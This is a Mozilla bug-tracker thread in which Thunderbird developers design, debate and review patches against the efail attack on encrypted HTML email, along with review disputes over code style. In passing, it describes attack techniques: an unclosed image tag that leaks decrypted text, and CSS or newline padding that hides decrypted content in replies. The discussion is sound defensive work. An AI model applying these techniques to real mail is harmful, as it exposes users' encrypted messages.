I would always run all cited text through the "HTML sanitizer" (Simple HTML). It will strip all funky HTML and leave only basic HTML in there. To avoid other attack vectors, I'd do that for all email, not just encrypted ones. I've seen other security and privacy bugs in HTML Replies, and that would stop them all cold. After all, it is only for quoting/citing.
The HTML sanitizer was made for cases like this: To be secure.
Going down to plaintext (even if only for encrypted mail) is IMHO a little too drastic and not necessary.

Ben, are you sure this would help in all cases? I suspect that you could still get a HTML tag containing hidden text which stems from a MIME part that was invisible at viewing time.

I'd have to test and check that.
However, just pasting encrypted text somewhere in the body wouldn't automatically decrypt it, would it?
If I understood the attack right, it bases on tricking the user into running a URL, either as <iframe> or <form> or <img> or style sheet or what have you. I am fairly confident that the sanitizer neutralizes all of these URL runs, at least that was its primary design goal.

No, that wouldn't work.
According to the Efail authors, it's apparently also possible to play tricks with mixing double and single quotes in a clever way in HTML. Is this also sanitized?

For end users, simple short-term mitigation: Enable menu View | Message Body as | Simple HTML.
That should run all HTML mail parts through the sanitizer before it hits other parts of Thunderbird and remove active URLs, at least that's the basic idea. I'll have to test each PoC to check whether one of them slips through, though.

After discussing with Patrick, we both think there are several issues at work here, and that this problem needs 3 different fixes:
1. Separate MIME parts from each other
We currently output a cut-off HTML document, and concatenate that with other MIME parts, and construct a single document out of all these MIME parts. This is the cardinal bug here.
The correct solution here is to jail each MIME part into a separate <iframe type="content"> in the UI.
However, we don't want one scrollbar for each MIME part, but one scroll for the entire body. <iframe seamless> would allow that, but it was never implemented in Firefox and is now dead. We might later find a workaround, but this is more work and can't be done short term.
Together, we had the idea of running the HTML document through the HTML parser. The parser will clean up the HTML and close any open tags and attributes and the serializer will output a complete HTML document. That avoids that we end the MIME part with <img src=" and stops this attack cold.
It's not pretty, it's slower, and it's not a perfect solution, but it should fix the bug here, and all known variants of it.
2. Sanitize quoted HTML
The composer is more vulnerable than the viewer. In the viewer, we assume malicious code and harden against it. Not so in the composer, which assumes that the user enters the data.
After all, this is just a quote/cite. We only need to preserve the essence of it, enough for a citation.
That's why we should sanitize the HTML that we quote from the original message and insert into the user's mail.
This should close a whole class of attacks that
a) attack our composer
b) attack the recipients of our user
(which could lead to interesting constellations, esp. when it comes to decryption and trust)
So, I think this will be an important protection going forward.
3. Only decrypt, if the entire message is encrypted, not attachments
Normally, if we receive an encrypted email, the entire email will be encrypted. There's little point in leaving part of the message encrypted.
Part of the bug here was that we are automatically decrypting and inlining MIME subparts. That led to that "mixed content". Patrick had no way to stop that "mixed content" in Enigmail, because the code is in libmime.
We should only automatically decrypt a message, if the entire message is encrypted. That's true for all normal encrypted emails.
If an attachment is encrypted, we should simply show it as external attachment. The user can click on it to open or save it.
(In the first version of the patch, I might only allow saving the attachment, not opening it directly by double-click - depending on how difficult it is to implement.)
I have a good part of this already implemented. Patches will follow.

Attached patch

[Sanitize quoted HTML](attachment.cgi?id=8976050&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976050&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050)

This is a fix for 2. Sanitize quoted HTML
I am not completely sure that I found all the necessary places to insert the code. My goal is to sanitize all foreign HTML content that's inserted into the composer, whereby "foreign" means anything not created by our user, anything coming from the network. If anybody knows additional places to cover, please let me know.
I've tested this by
1. setting View | Message body as | Original HTML
2. opening an Amazon HTML email
-> It display with colors and <table> boxes and everything, in the viewer
3. Clicking Reply
Without the patch:
-> The inserted quote has colors, boxes etc.
With the patch:
-> The inserted quote is the sanitized HTML version,
without colors, with broken remote images (as intended),
basically just text, but with links etc..
Same that you get with View | Message Body as | Simple HTML.

I've addressed the nits be removing the unneeded variables and I've added a proper patch header. Not sure why people still think they can submit raw diffs as patches. So reviewers have "Automatic r- if the patch doesn't contain a decent commit message" in their nick.
For the test message I attached, this works great! The decoded text becomes clearly visible in the composition.
However, forced general sanitisation of all quotes is not really acceptable. It destroys HTML replies for all users.
Can you please include a check whether the sanitisation is necessary? That's the tricky part, but you're on the right track.
Not sure whether this should be an f+ for the initiative and the promising approach or an f- for destroying things for everyone :-(

That used to be the case, but not so in 52 and above. The composer no is no longer treated differently (as an EDITOR).

Maybe the code in mailnews/mime/src/mimecryp.cpp can tell us whether anything was decrypted while preparing the quote. I haven't looked. To find the right hook here would be the detective task. Sadly I don't know how it hangs together.

I agree this is what's need to be done. It's not clear from your comment, but \*each html part\* should be run separately through the parser and re-serialized out - this makes sure there are no unclosed elements and other strangeness. After that you can keep the outputs it all together as one chunk again and let the parser figure out the final document.
If you can figure out where to do that, the bug is solved.

We can't allow these kinds of bugs to continue. This is not the first, I remember we had a similar bug not too long ago where stuff ran only on reply and caused a security problem. That one was not about encryption.

Attached patch

[Separate MIME parts from each other (for 52)](attachment.cgi?id=8976074&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976074&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976074)

This implements a new MIME class that is now used for normal HTML parts (unless you use the sanitizer). It takes the HTML source text, runs it through the Geclp HTML parser, and then immediately serializes it out again. That ensures that all tags and attributes are closed and the HTML is syntactically correct.
This happens for every MIME part with HTML. This should fix the main bug here.
I've been working on this all night long.
Thanks to smaug for lots of help with the DOM APIs. Main problem is that many APIs are now removed. Indeed, the DOM Parser API is also removed, but there's a replacement API in 61, I've noted that as comment in the code. This patch is for 52 and should also work more or less for 60.

Sanitizer code cleanup
1. I removed the pref migration code, because that migration happened in 2012 and it should be long done. Even then, it only concerned users who had manually modified that pref. I think that was only a dozen users world-wide even back then, so that's surely useless code now.
2. Removed my debug code
3. Renamed one variable to be clearer
4. Moved the comment from the header to the implemetation file.
5. If you allow presentational stuff, then also allow CSS. That's the only logic change here. The change only affects users who manually changed this hidden pref. Again, only a handful users, probably.

Ben, can you please provide patches that compile on trunk. I've fixed this and I also addressed the style nits.
I've also included the code for TB 60 and below (untested).

> Ben, can you please provide patches that compile on trunk.
My focus right now was TB 52.8.0, because that needs to get out the door. The APIs are different, as you are painfully aware.
(And also because Enigmail failed on trunk for me, and 60 crashed on startup.)
Thanks for the update to trunk.

> I thought we had agreed that this was too drastic.
You and Magnus simply stated that. I never said that I agree. Both Patrick and me think that this is the way to go.
But I had an idea: The sanitizer is drastic also on presentational HTML, which is not required for security. I can drive the sanitizer in a mode that removes all the stuff potentially problematic for security, but keep presentational HTML like tables and <font> and CSS.
How about that?

> I thought no-styles was a feature for this particular code...
It's only a secondary feature of the sanitizer, not the primary one. There's an existing pref for it, and with this code, the style would be enabled based on that pref. See point 5 of [comment 73](/show_bug.cgi?id=1419417#c73 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"). I could rename the pref to be clearer, though, if you like?

At least on my test e-mail ([attachment 8975458](/attachment.cgi?id=8975458 "A1-dec-pgp-smime-html-reply.eml") [[details]](/attachment.cgi?id=8975458&action=edit "A1-dec-pgp-smime-html-reply.eml")) this works well.
We certainly need to get a try run for this, so updating it to trunk, painfully, since I've done all those ports myself, even the one in nsWMUtils.cpp. In fact, I asked Boris to provide a C++ interface which was created only for use in TB and can break any minute, since there is no test for it. Someone needs to write a gtest, if we're using this now in a central location and not just some "Windows Live Mail" import. See [bug 1454842 comment #13](/show_bug.cgi?id=1454842#c13 "RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser").

Is this still required? With the MIME patch I see the fully decrypted part, so I'd be pretty foolish to quote that. Why do you still need sanitising? If you do, of course it needs to be done in a way that the rendered page looks the same with and without sanitising.

A style nit of my own:
The notation
result = some\_long\_condition()
? if\_yes()
: otherwise();
is important for readability. Esp. so as the expressions get more complex, like here.
If it all fits in a single line |foo = works ? 1 : 0;|, that's fine, but if it's complex enough that you add a linebreak, then true and false results should be on their own lines. Much like if clauses, really.

As a safety measure.
I am not just looking to fix this exact bug and PoC, but all bugs of this nature. That's the only way to ever get an application secure.

This addresses Jörg's review comments.
(NIT: If I wrap lines, I indent it 4 spaces, not just 2, to clearly distinguish from indented blocks. But on your request, I adapted it, although I find it less readable.)
Thanks, Jörg, for testing this on trunk. I incorporated your trunk changes in my patch. I've made it default to 52, so that it compiles here and so that we can land it on 52 branch, but before landing on trunk, I'd remove the TB52/to code and #ifdef.
Jörg: Given that you did the review, and tested it, can you r+ it, please?

Does the HTML sanitization work touch on the CSS issues mentioned in the efail paper at chapter 3.1, where it briefly discusses a CSS redressing attack? I want to make sure that any CSS issues there aren't slipping by the updated sanitizer for simple HTML.

Attached patch

[Sanitize quotes, v4 (for 52)](attachment.cgi?id=8976363&action=diff) (obsolete)
— [Details](attachment.cgi?id=8976363&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976363)

OK, so for the quote sanitation, I have good news and bad news.
The good news is that if I enable presentational HTML and styles, the result looks the same to me as without sanitation. (There might be minor differences, but I haven't noticed any.) So, this does look like we could ship this as default for everybody. It would remove a whole class of attacks.
The bad news is that the Gecko HTML sanitizer is not able to remove URL references from CSS rules/styles. The sanitizer I had written back in 2004 could do that, but the rewrite by Henri cannot, unfortunately. He was aware of that, and that's why he has an |if| that disables all CSS (althogether, even the innocent rules), if I say that I don't want external resources.
We should later add support to remove external URLs from CSS. But right now, we have no sanitation at all and allow flat out everything, so this is no worse than before.
I've made a band-aid fix that removes that |if|. The caller can still control it, because the allowStyles has its own flag. Thunderbird and DirectorySericeProvider are the only users of this sanitizer, and all callers set AllowStyles properly, so removing that automatic is not a concrete problem, and fixes the issue The only problem is that I'd need to patch Gecko.
Anyway, the patch as attached works, and is a massive improvement over status quo. I don't see any drawbacks. I'll attach a screenshot.Flags: needinfo?(ben.bucksch)

This is a hidden preference. Very few users know will use it. We change the behavior of it, and to the better (for that user group). The users who set this will immediately notice, look up, and be happy that we've made it more useful now. I don't think that effects more than a dozen users world-wide, frankly.

Single phrases in comments don't get full stops, like in the UI. See e.g. mimemoz2.h and many other files.

This is the libmime style. It's like that \*everywhere\*. I didn't change this.

OK, can remove them.
But I'd rather focus on the security bugs.

heh!!
Yes, hopefully, that won't be necessary. I'd like to get these fixes in, though. Then we can talk about cleanup later.
I'd like to make sure that neither this particular attack, nor any other similar one will work in the future. Once a weakness is identified, that area has a mark on its back and security researchers will use that as idea and try the attack in other ways.

I assume you refer to this phrase:
"... require user interaction.... in Thunderbird and Postbox we can completely redress the UI with CSS and trick the user into submitting the plaintext with an HTML form if he clicks somewhere into the message"
With "redress", I think he means to fake/mock TB UI in a message, to make the user click on it.
The mocking of UI has always been possible since images in mail exist, so that's not a bug in itself. If we do something nasty on click, that's a problem we should fix. And I think that's all they are trying to say here. I think they are solely trying to counter a hypothetical counter-argument of "Yes, it leaks confidential information, but only on user click, so it's not a problem". But we're not saying that, we're not discarding the problem, but trying to fix the problem of leaking the information in the first place, so the click itself into the message is not important. We do agree that this should not cause harm, and I think that's all they are trying to say here.
If the user clicks "Load remote content" in \*our\* UI, that's a different story. If the user does that, we can't prevent leaks, because the user specifically requested the external call. But that's not what they are talking about here.

\* 2. Composer, before (TB 58.7)
\* 3. Composer, with patch v4, sanitizer, but allowing styles
\* 4. Composer, with patch v2, full sanitation
As you can see, you see nothing :-) ...that is, no difference between 2. and 3.
That means that Sanitizer patch v4 makes no noticable changes to the quote result, even though the sanitizer ran over the quote and cleaned it from most problematic HTML.

(In reply to Ben Bucksch (:BenB) from [comment #94](/show_bug.cgi?id=1419417#c94 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"))
Let's not discuss about style nits, you're wasting more time on the discussion than actually fixing them, or just picking up what I have already fixed.
I know that MIME is old code with a hotchpotch of ugliness and I am certainly opposed to adding more ugliness.
The style-guide says that all sentences get a full stop at the end, so it doesn't hurt to add them. There are pre-existing examples:
// SaveAs in new modes doesn't work yet.
/\* Use the class we've got. \*/
/\* Descend into messages only if we're looking for a specific sub-part. \*/
/\* First initialize the superclass. \*/
We don't use spaces before parameter lists for the obvious reason of being able to search for functions with "XXX(". There are pre-existing cases of this in MIME, for example (at random):
mime\_subclass\_p(MimeObjectClass \*child, MimeObjectClass \*parent)
mime\_imap\_part\_address(MimeObject \*obj)
We don't use spaces after a cast, which you do correctly in your patch on some occasions:
int status = ((MimeObjectClass\*)&MIME\_SUPERCLASS)->parse\_eof(obj, abort\_p);
Because in the past no one enforced a consistent style in MIME we're at the mess we are now. So please no further discussion, just fix what I asked for. Correct style should be automatic and then you can focus on the actual problem.
Further comments on the tree patches presented:
"Sanitizer code cleanup, v2":
You misunderstood what a "hidden" preference is. The preference in question is listed in mailnews.js and therefore listed in about:config. We have real hidden preferences that don't show up there. It is also widely discussed on the web, please Google it. We even get complaints when changing real "hidden" preferences (last for mail.ui.display.dateformat.thisweek and friends). So I don't think it's a good idea to change the name unless you offer some migration, which is easy to do:
<https://dxr.mozilla.org/comm-central/source/mail/base/modules/mailMigrator.js>
Also please present a patch that applies to trunk.
"Sanitize quotes, v4 (for 52)":
I haven't tried this but I'd like to hear how you plan to go about the M-C change included in the patch. Are you going to present this for review in M-C. Once landed in trunk, we could then uplift it to our branches. We usually don't take patches are not in M-C and don't have a plan to ever get there. In general, rules for all contributors to Mozilla code apply to you as well: So please don't mix hunks from different repositories in the same patch, since by definition the patch already doesn't apply and needs manual intervention by all people working on it. Please supply patches with proper HG headers stating your user and a decent commit message. This is essential even earlier on, for example for try pushes.
"Separate MIME parts from each other, v4 (trunk and 52)"
That looks promising, I haven't reviewed it yet, I've just flagged some obvious style issues, made it apply to trunk and shipped it off to try. Please address the test failures:
TEST-UNEXPECTED-FAIL | comm/mailnews/db/gloda/test/unit/test\_mime\_attachments\_size.js
TEST-UNEXPECTED-FAIL | comm/mailnews/db/gloda/test/unit/test\_mime\_emitter.js
I'm not happy to distribute code to 10-25 million users where the own author added this comment:
+ /\* honestly, I don't know how that charset stuff works in libmime.
+ The part in mimethtm doesn't make much sense to me either.
+ I'll just dump the charset we get in the mime headers into a
+ HTML meta http-equiv.
+ XXX Not sure, if that is correct, though. \*/
Maybe that needs further investigation since TB was riddled with charset issues (before I cleaned most/all of the up) and mojibake caused by wrong charset selection is not acceptable. Oh, I see, was copied from mimethsa.cpp, so perhaps you can include that comment in your clean-up.
As for the review: I haven't had time to actually understand what the patch does, perhaps you can explain it or point me to the comment where that was already explained. You're adding a new MIME class mimeInlineTextHTMLParsedClass and I see code that switches to using that new class. Can the old one mimeInlineTextHTMLClass be removed? Running with the patch, I see horizontal lines between the different parts now. Where do these get added? I think we need to add some class and CSS since currently they don't appear to have any margins/spacing and are just glued to the preceding text.
Final comment: Ben, I appreciate your expertise in this area and your contribution here. Please adhere to the rules that apply to everyone in the project to make collaboration as smooth as possible. I know you're working on an urgent security problem (or better, one that has finally become urgent), so we will need to cut some corners in the process but code formatting and covering all cases (see charset) won't be one of them.

Additional comment: You said in [comment #86](/show_bug.cgi?id=1419417#c86 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") that sanitising is a safety measure. Should we move that to a different bug since this one here is quickly becoming confusing and the solution also needs an M-C change?

That's an old comment that I had copied. Turns out, that code apparently works fine since ~15 years for those 25 millions.
That's also why I removed it. You probably merely noticed the removal.

I know, normally, but not here. libmime is different. I was simply copying code as a template for my class.
<<https://developer.mozilla.org/en-US/docs/Mozilla/Developer_guide/Coding_Style>> says:
"The following norms should be followed for new code. For existing code, use the prevailing style in a file or module."

That's the classic bikeshed <<https://en.wikipedia.org/wiki/Law_of_triviality>>.
I'd rather focus on how we can get the users as secure as possible.
I had spent the entire night coding this, to get this out as quickly as possible. I have already fixed a number of things you wanted fixed, including whitespace, and now you want more changes. It's one day later, and we're no closer.
I'd be happy to discuss the merits of the patch with you on the phone, and explain everything. As long as we agree to focus on securing end users.

Bikeshed or not, Jorg's goal is to do a proper review. And if it's not done by Jorg then it will be someone else. So let's have the goal be not just security but a fully vetted patch.

Please read [comment #98](/show_bug.cgi?id=1419417#c98 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") again. I've copied examples from \*existing\* code that do it right. I don't have the time now to do a statistical analysis to see what's "prevailing". As far as I can tell, MIME is a mess, so we can just use "correct" style now.

Ben, please read [comment #98](/show_bug.cgi?id=1419417#c98 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails") again. There are rules that apply to anyone in Mozilla. You're not exempt, neither are other Mozilla luminaries, like Boris and Ehsan. The only difference it that when they are pointed at a nit, they just fix it. We're not closer to anything, since you submitted patches that don't apply to trunk, had no try run, no commit messages and mixed hunks from different repos. Who do you think should fix all this before landing?
> I'd be happy to discuss the merits of the patch with you on the phone, and

I prefer to document this in writing here.

Sanitizer code cleanup, v2

Formal reasons:
- Patch doesn't apply to trunk.

Factual reasons:
- Not a good a idea to change preference names at 52.8.x or 52.9.x.
The preference in question is publicised on the web.
- Would be OK to change for TB 60, but only with migration code
(which is easy to do).

- Mix of hunks for C-C and M-C

If he found a bypass for (which?) current mitigation, then it doesn't belong here since this mitigation here wasn't shipped yet. Or did he apply the patches, compiled and then found that the specific solution proposed in the patches here doesn't work. Only then we're interested in this bug, anything else needs to go elsewhere.

Simply open a random typical libmime file, like mimehdrs.cpp, mimethtm.cpp, mimeebod.cpp.
If I now start using a different style, as you ask me to, \*that\* would be a "mess".

No, because it's the base class for this one here, and for the sanitizer.
Also, I would like to leave it in, in case we go back to straight pass-thought. I'll explain more to you in person why.

I tried to reach you on the phone twice, but couldn't reach you.
This back and forth in async writing, and waiting for each answer for hours, takes too much time, both calendar time and my work time.
I'd like to get this finished. If we can work together on this, in realtime, we can get this done in a matter of 2-3 hours. We can't have this drag on like that. I neither have the time, nor can the users wait any longer. My offer to collaborate is there. You have my phone number.

Sorry, half finished comment:

Yes, it does. You can see that in mimei.cpp. That's the switchboard class that decides which class implements what.
The only reference I left in is the "avoid" blacklist, and that's just a safety net.

Ben, to get positive review of the "Separate MIME parts from each other, v4 (trunk and 52)" patch, can you please address the test failures. The horizontal lines without margins/spacing are another \*real\* issue aside from the style discussion.
Please document what you have to say about the technical issues here. It needs to be documented. Phone calls are not the normal form of developer communication in Mozilla. Typically an issue can be settled within a day if all participants are in the same time zone and reply a few times during the day.

It's not surprising that they fail, given that we intentionally change the output here.
I don't have the test suite set up, and last time I tried, it cost me a whole day to get it running. Could you please help me out there adapting the tests? That would be much appreciated.

> > The horizontal lines
> Honestly, I don't know where they come from
I found out. These are the inline attachment delimiters that Thunderbird always puts between the different documents/attachments.
You can easily reproduce that by sending yourself an email with HTML attachments (or plaintext, for that matter). You will see horizontal lines. For illustration, I used empty HTML documents, and opened them in a 52.8.0 without my patches, and made a screenshot, attached here.
In the screenshot, you will see "empty.html" in the line, which makes the purpose of these lines clear. That's obviously the file name of the attachment shown, and the name is taken from the MIME headers Content-Type: name="" or Content-Disposition: filename="".
Now, when you open the attack email in a 52.8.0, you don't see these lines. But you should. That you don't see them is an effect of the attack in action and code failing to do what's intended. We never intended for an S/MIME part to be between 2 HTML parts.
When you open the attack email with my patch, you see the attachment separator lines again. That's not a bug, but actually the normal Thunderbird behavior (see above), and a sign of things working normally.
So, why is the filename missing? Remember that the attack emails are hand-crafted, so they're not playing as nice. They do not contain the file name, just "Content-Type: text/html", no name="", nothing else, and no other MIME header. So, we don't have a file name to display, and we do the only reasonable thing we can do: display a horizontal line between the different attachments. Given that the attachments are themselves empty, you end up seeing only these lines.
This test email is looking odd only because it's a specifically crafted attack email with no content, no filename, odd MIME output etc..
So, in fact, these lines are working as they should.

Sanitizer code cleanup, v2
> I don't care much about the pref,
Thanks for being pragmatic, Magnus.
Given that I AllowStyles doesn't actually work with CIDOnly, it would need the mozilla-central hunk from Sanitize composer, v4 patch, it makes sense to remove that part from the patch. That then also makes the pref name change moot, so I can revert that as well. That would make this "cleanup" a pure code cleanup with no functional changes. So, it's for trunk only anyway.
> but this (and other patches) need to apply to trunk
Yes.
I'll try to make patches for trunk, but I can't promise it, because I'm running out of work time on this here.

Thanks, I reread that. It's still unclear why we can't kill mimeInlineTextHTMLClass. I'm not familiar with (pseudo-)"classes" in MIME, as far as I know the code, it's a mess of passing function pointers around and has little to do with OO design or a C++ class hierarchy. Mercurial can certainly resurrect old code if necessary.

Very simple, you add |ac\_add\_options --enable-tests| to your .mozconfig.
You run the tests, assuming M-C as top source dir with:
./mach xpcshell-test comm/mailnews/db/gloda/test/unit/test\_mime\_attachments\_size.js
./mach xpcshell-test comm/mailnews/db/gloda/test/unit/test\_mime\_emitter.js
Otherwise it's:
mozilla/mach xpcshell-test mailnews/db/gloda/test/unit/test\_mime\_attachments\_size.js
The latter failure looks trivial:
"<html><head></head><body>I am HTML! Woo! </body></html>" ==
"<html><head>\\n<meta http-equiv=\\"content-type\\" content=\\"text/html; \\"></head><body>I am HTML! Woo! \\n\\n</body></html>"
Looks like you just need to change the test expectancy here.
(As you know, my contract is currently on hold, so I'm back to volunteer status and I exhausted the promised volunteer hours for this week already fixing bustages so we can actually run tests and land these patches when ready. I trust you understand that I won't be able to assist further.)

Sanitize quotes, v4 (for 52)
I've moved the "sanitize quoted HTML" part to [bug 1462488](/show_bug.cgi?id=1462488 "RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying").
I still think that this should be part of the fix here, in one way or another. But a separate bug allows easier discussion.

That a common first impression when somebody who knows C++ looks at libmime. If you understand it, it's actually brilliant. jwz wrote it, who is actually one of the founders of mozilla.org and was the tech lead in the beginning. C was a requirement for him, so C++ OO was out.
So, he wrote a completely OO system in pure C (!) for libmime. It actually has all OO properties of encypsulation, inheritance and polymorphy. And, although it's using function pointers (like all OO systems in C), it's actually type safe. That's better than the OO system of GTK+ (which Mozilla also uses, I might add), which is not type safe.
So, yes, the code looks all yucky to people who work in C++, but it's actually brilliant for C code. libmime is the misunderstood step child of Thunderbird. Please don't beat on the poor guy. He's been doing great work for us for many years, with few problems.
I might add that the real bug here is not actually coming from libmime. libmime does its part correctly here. The problem is in the frontend that is unable to put each MIME part in its own <iframe> as it should. The fix is in libmime, because it's just a workaround against failures in higher layers.

Thanks that you helped me with the trunk adaption. I spent most of the night trying to get a trunk build and failed. It doesn't compile here. (Could be related to my system, as the tree is green.) So, sorry, I can't make trunk patches right now.
Thanks also for your help above with the tests. If indeed it's just adapting the expected result values, it should be trivial, yes.

Yes, I agree 700%. See [bug 1297653](/show_bug.cgi?id=1297653 "NEW - html attachment with CSS breaks email rendering"), ancient [bug 31052](/show_bug.cgi?id=31052 "NEW - Display attachments inline: Contents & formatting of attached HTML file (background/CSS styles/position:absolute/dir=\"rtl\"...) leak into main HTML part or vice versa (wrong bgcolor/images/unclosed tags...: unreadable; multipart/mime, iframe,send web page)") and friends. You approach here to at least ensure syntactical correctness of each HTML part by parsing it separately is a good step in the right direction. Even without <iframe seamless> we should implement [bug 1297653](/show_bug.cgi?id=1297653 "NEW - html attachment with CSS breaks email rendering"), so at least HTML attachments don't bleed CSS into the body.

Ben, can you also please provide a test for the new MIME parser class. As per [comment #83](/show_bug.cgi?id=1419417#c83 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"), the C++ interface mozilla::dom::DOMParser::CreateWithoutGlobal() was created only for TB, it is not covered by any M-C tests and can break silently any time, see [bug 1454842 comment #4](/show_bug.cgi?id=1454842#c4 "RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser"). It was previously only used in "Windows Live Mail" import but it is now moving onto the main code path for HTML mail. So it would be good to write an M-C gtest to guarantee its functioning so M-C bustage doesn't hit us. At the very least we should write a C-C test that loads a HTML mail with "doubtful" content and then checks that the body is properly "corrected". We have many Xpcshell and Mozmill tests that load messages from file, process them and then check their body/content. So it wouldn't be hard to copy something together. The last one I did was in [bug 1456001](/show_bug.cgi?id=1456001 "RESOLVED FIXED - Write test for bug 1454257 - Treatment of folded headers in nsParseMailbox.cpp").

The problem isn't the missing padding, it's applied. When you view the body as plain text the padding is correct. The problem is on HTML and Simple HTML: The message text isn't placed inside the moz-text-html class like in moz-text-plain. You can see the position of the closing </div> I marked with the red arrows.
Because of this, the moz-text-html class has a height of 0px and the following class is placed directly after the text.
When the text would be inside the class, all should be correct again.Flags: needinfo?(richard.marti)

Sorry, I have run of time for this bug. I spent most of the week on it (27 hours). Given that I'm not paid for it, I have to stop here.
> [the Gecko API we use] can break silently any time, see [bug 1454842 comment #4](/show_bug.cgi?id=1454842#c4 "RESOLVED FIXED - Port bug 1453869: Replace use of nsIDOMParser").
I see your point. A test would be useful. But if the parser API indeed goes away, we'd fail to build. If it was building, but not working properly, lots of existing tests would fail, because this is now the default handler for HTML mails. So, I would say we have sufficient coverage. But... if you want to add a specific test later on, that's fine. I don't think the time is now, though.
In any case, I myself cannot spend any more time on this. I'll be available for help, if you need my expertise. If you want to polish this patch further, please go ahead. I'd only request that you attribute the commit to me.
The patch works, with 52 and trunk. 3 days ago, I've spent an entire night on this, to get out as quickly as possible. Please land it and get it out now.
People are waiting for the fix, eyes are on us. Every day we delay the fix causes PR damage. Please speak to Ryan, he spent the whole last day putting fires out.

For the unit tests, I would recommend:
\* For existing tests, simply change the expected outcome to the current outcome.
\* For a specific test case for this bug, I would
\* take the emls attached here, and
\* use some existing test code that compares a test email with the libmime output. Then,
\* check that the actual output is the current output.
\* If you want to reduce spurious test failures, you could use an email with only the cut-off HTML part.
The expected output would contain the closing tags.
That should be reasonably quick to develop for somebody. But with all the build problems I had, on trunk and 60, and the review, I ran out of time. Sorry.

To inform beyond those who I have PNed and are on drivers list, early this week we decided release 52.8.0 with the patches in hand to get them in the hands of users, and not wait on this last bug. That release is immenent. The other efail patches will be mentioned in the CVE linked from the release notes.

Ben, I guess we can organise for someone else to write the tests, but with your MIME knowledge, please look at Richard's [comment #133](/show_bug.cgi?id=1419417#c133 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"). Something isn't right with the HTML the new MIME class produces.
Thanks Richard, for the analysis. BTW, could you decode the message part?

Ben, I looked at the DOM for "simple HTML". Sadly, that shows the same problem. The text content is not inside the <div>, thus proper CSS isn't applied. Richard, can you please confirm.
So "simple HTML" appears to have a bug which is now exposed on the code path for "original HTML". I'm sure you agree we can't accept the patch in it's current form. Could you please take a look how to fix this issue.Flags: needinfo?(richard.marti)

Ah, I see. Yes, that should be trivial to fix.
That code is already in the Normal HTML class. So, we need to either make sure to call the super function properly, I guess we simply don't do that, or we need to add corresponding code to the specialized classes.

Since the little brother mimethsa.cpp just got a clean-up, I've done the same here (so we can stop the discussion and focus on the (severe) issue at hand). I've also removed the conditional compile code, since we won't land that on trunk. That will have to be restored for TB 60 and TB 52 but we cross that bridge when we get to it.
The test failures and the "text outside div" ([bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>")) are blocking this.

Sadly, this is a required step to prevent efail, but this is not fixing it for reply/fwd.
I thought earlier just converting to plain text would fix that, and it would mitigate for sure. But thinking about that some more, you could put enough newlines to push the content out of view then.
When using html, even with this patch, styles leak over between parts and can hide the content of the encrypted part so you would't see it when composing (either).

I believe this is wrong (and at this point no content type should be output). Haven't checked if it's just ignored or would cause problems.

Magnus, the current code is erroneously using "Context-Type", see:
<https://dxr.mozilla.org/comm-central/rev/9c9d0d5d6c8292e20b06cc895ed3b97eb55afe4f/mailnews/mime/src/mimethsa.cpp#82>
The new code, which is an adaption of mimethsa.cpp copied this error, also had it. I noticed when making the test work, so I corrected it.
Let me reshuffle the patches. Until the test patch has r+, I cannot land this. Also, [bug 1462895](/show_bug.cgi?id=1462895 "RESOLVED FIXED - In \"original HTML\" and \"simple HTML\" view the body of the message is placed outside <div class=moz-text-html>") is blocking the fix here since we would be using incorrect DOM for all HTML views, not just simple.

It's your own code cleaned up, so why the r-? By mistake?
All I changed was
- fixed "Context"
- white-space issues

Separate MIME parts from each other, v4b (trunk only, with clean-up)
I think that was by mistake or perhaps due to the white-space changes Ben didn't like. For the record, currently 378 functions don't have a space before the parenthesis, 313 do. So the prevailing style is what this patch does. r- will only confuse Magnus, since the predecessor already had r+ and I fixed the Context issue here, and I'm just checking this is what Magnus meant.

I found the <div> problem.
The superclass parse\_line() function was called correctly. However, in eol(), we called the superclass eof() function - which is what outputs the closing </div> tag - at the \*beginning\* of the child function for HTMLParsed and HTMLSanitized. These classes need to buffer up everything in memory and - due to lacking streaming APIs in Gecko - parse it all at once in eof(), not in parse\_line(). These 2 facts in combination meant that the </div> was output before the actual HTML content. Once I realized that, it was trivial: Move the superclass function call of eof() to the end of the eof() child function, and it works.

I don't think it's good idea to hardcode the number of linebreaks and that "windows-registry-key" test is a hard-to-read and failure-prone way to say "this is Windows".
I would recommend to do what you did in the second test: before calculating the string size, simply remove the <meta> tag (if it exists) - which would still work and not break the test, if we would go back to the old way, which I anticipate - and you can do the same with the LFCR, by simply removing all LF before getting the size.
However, I don't want to be a pain like some other reviewers :-), and I don't care about these tests, so giving you an r+ anyway. I think what I said should be fixed, but it doesn't have to be right now. It's most important to get the fix out.

It's not fixing for composition because the decrypted content is still there in the reply, even now when the parts are parsed separately. It is mitigated quite a bit because you can't(?) that easily hide the decrypted content completely. You can however end the first html part with 100 newlines, or, put <style>\*something matching everything but your content { display:none } </style> inside the first part.
That will blead into the second part to hide the content, and when you reply you will not see it.
If the content is decrypted, we need it marked some way to remove it. I'm not really sure how, because the legitimate use case of replying and quoting an encrypted message should still work of course.
> Compare [comment 63](/show_bug.cgi?id=1419417#c63 "VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails").
